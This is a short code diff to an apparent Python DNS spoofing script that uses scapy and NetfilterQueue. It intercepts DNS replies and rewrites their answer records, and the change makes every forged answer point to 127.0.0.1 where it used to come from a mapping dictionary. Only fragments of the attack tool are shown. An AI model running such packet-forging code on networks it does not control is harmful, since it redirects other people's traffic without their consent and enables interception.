@@ -1,8 +1,6 @@
-from scapy.all import *
-from netfilterqueue import NetfilterQueue
-from scapy import *
-import os
 
+from netfilterqueue import NetfilterQueue
+import os
 from scapy.layers.dns import *
 
 # DNS mapping records, feel free to add/modify this dictionary
@@ -52,7 +50,7 @@ def modify_packet(packet):
     # craft new answer, overriding the original
     # setting the rdata for the IP we want to redirect (spoofed)
     # for instance, google.com will be mapped to "192.168.1.100"
-    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
+    packet[DNS].an = DNSRR(rrname=qname, rdata="127.0.0.1")
     # set the answer count to 1
     packet[DNS].ancount = 1
     # delete checksums and length of packet, because we have modified the packet
